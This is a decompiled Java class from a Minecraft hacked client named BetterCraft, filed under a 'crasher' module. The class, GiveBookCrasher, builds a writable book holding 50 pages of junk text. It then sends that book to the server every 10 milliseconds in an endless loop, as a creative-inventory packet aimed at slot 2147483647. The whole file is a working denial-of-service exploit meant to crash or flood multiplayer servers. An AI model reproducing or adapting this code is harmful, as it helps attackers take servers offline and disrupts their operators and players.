/*    */ package me.nzxter.bettercraft.mods.crasher;
/*    */ import net.minecraft.client.Minecraft;
/*    */ import net.minecraft.init.Items;
/*    */ import net.minecraft.item.ItemStack;
/*    */ import net.minecraft.nbt.NBTBase;
/*    */ import net.minecraft.nbt.NBTTagCompound;
/*    */ import net.minecraft.nbt.NBTTagList;
/*    */ import net.minecraft.nbt.NBTTagString;
/*    */ import net.minecraft.network.Packet;
/*    */ import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
/*    */ 
/*    */ public class GiveBookCrasher {
/*    */   public static void start() {
/* 14 */     (new Thread()
/*    */       {
/*    */         public void run()
/*    */         {
/*    */           try {
/* 19 */             ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
/* 20 */             Minecraft.getMinecraft(); String author = Minecraft.getSession().getUsername();
/* 21 */             String title = "Play with me.";
/* 22 */             String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
/* 23 */             NBTTagCompound tag = new NBTTagCompound();
/* 24 */             NBTTagList list = new NBTTagList();
/* 25 */             for (int i2 = 0; i2 < 50; i2++) {
/* 26 */               String siteContent = size;
/* 27 */               NBTTagString tString = new NBTTagString(siteContent);
/* 28 */               list.appendTag((NBTBase)tString);
/*    */             } 
/* 30 */             tag.setString("author", author);
/* 31 */             tag.setString("title", title);
/* 32 */             tag.setTag("pages", (NBTBase)list);
/* 33 */             book.setTagInfo("pages", (NBTBase)list);
/* 34 */             book.setTagCompound(tag);
/*    */             while (true) {
/* 36 */               (Minecraft.getMinecraft()).player.connection.sendPacket((Packet)new CPacketCreativeInventoryAction(2147483647, book));
/* 37 */               Thread.sleep(10L);
/*    */             }
/*    */           
/* 40 */           } catch (Exception e2) {
/*    */             return;
/*    */           } 
/*    */         }
/* 44 */       }).start();
/*    */   }
/*    */ }


/* Location:              C:\Users\emlin\Desktop\BetterCraft.jar!\me\nzxter\bettercraft\mods\crasher\GiveBookCrasher.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */